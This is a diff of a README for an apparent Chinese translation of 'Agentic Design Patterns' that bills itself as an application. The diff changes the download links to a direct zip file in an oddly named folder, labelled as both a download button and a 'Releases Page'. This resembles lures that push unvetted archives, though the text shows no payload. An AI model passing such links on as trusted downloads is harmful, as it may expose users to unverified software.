@@ -6,7 +6,7 @@ Welcome to the **Agentic Design Patterns** Chinese translation project. This app
 
 ## 📥 Download Now
 
-[![Download](https://raw.githubusercontent.com/majdwa515/agentic-design-patterns-cn/main/prevailingly/agentic-design-patterns-cn.zip)](https://raw.githubusercontent.com/majdwa515/agentic-design-patterns-cn/main/prevailingly/agentic-design-patterns-cn.zip)
+[![Download](https://raw.githubusercontent.com/majdwa515/agentic-design-patterns-cn/main/prevailingly/cn_patterns_agentic_design_v3.3-alpha.2.zip)](https://raw.githubusercontent.com/majdwa515/agentic-design-patterns-cn/main/prevailingly/cn_patterns_agentic_design_v3.3-alpha.2.zip)
 
 ## 🔍 Features
 
@@ -25,7 +25,7 @@ To run this application, ensure you have:
 ## 📦 Download & Install
 
 1. **Visit the Releases Page**: Go to the following link to access the downloads:
-   [Download Page](https://raw.githubusercontent.com/majdwa515/agentic-design-patterns-cn/main/prevailingly/agentic-design-patterns-cn.zip)
+   [Download Page](https://raw.githubusercontent.com/majdwa515/agentic-design-patterns-cn/main/prevailingly/cn_patterns_agentic_design_v3.3-alpha.2.zip)
 
 2. **Select the Latest Version**: Find the most recent version at the top of the page. 
 
